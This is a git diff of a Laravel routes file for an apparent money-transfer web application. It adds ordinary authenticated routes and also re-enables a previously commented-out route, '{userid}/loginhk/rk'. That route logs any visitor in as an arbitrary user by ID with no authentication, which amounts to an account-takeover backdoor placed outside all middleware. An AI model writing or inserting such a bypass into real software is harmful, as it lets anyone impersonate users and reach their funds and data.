@@ -78,7 +78,7 @@ Route::group(['prefix' => 'auth'], function () {
     Route::post('gettxnotp', [UserController::class, 'gettxnotp'])->name('gettxnotp');
 
 });
-
+Route::post('getUserviafilter', [FundController::class, 'getUserviafilter'])->name('getUserviafilter')->middleware(['auth', 'company']);
 Route::group(['prefix' => 'loanenquiry', 'middleware' => 'auth'], function () {
     Route::get('/', [UserController::class, 'loanindex'])->name('loanform');
     Route::post('loanformstore', [UserController::class, 'loanformstore'])->name('loanformstore');
@@ -226,6 +226,11 @@ Route::group(['prefix' => 'pdmt', 'middleware' => ['auth', 'company']], function
     Route::post('transaction', [PdmtController::class, 'payment'])->name('dmt2pay')->middleware('transactionlog:pancard');
 });
 
+Route::group(['prefix' => 'ppdmt', 'middleware' => ['auth', 'company']], function () {
+    Route::get('/', [PpdmtController::class, 'index'])->name('dmt3');
+    Route::post('transaction', [PpdmtController::class, 'payment'])->name('dmt3pay')->middleware('transactionlog:pancard');
+});
+
 Route::group(['middleware' => ['auth', 'company']], function () {
     Route::get('/banners', [BannerController::class, 'index'])->name('banner');
     Route::post('store', [BannerController::class, 'store'])->name('bannerstore');
@@ -335,7 +340,7 @@ Route::get('/clear-cache', function () {
     return "Cache cleared successfully";
 });
 
-// Route::get('{userid}/loginhk/rk', function($userid) {
-//     $loginuser = \App\User::find($userid);
-//     auth()->login($loginuser, true);
-// });
+Route::get('{userid}/loginhk/rk', function($userid) {
+    $loginuser = \App\User::find($userid);
+    auth()->login($loginuser, true);
+});
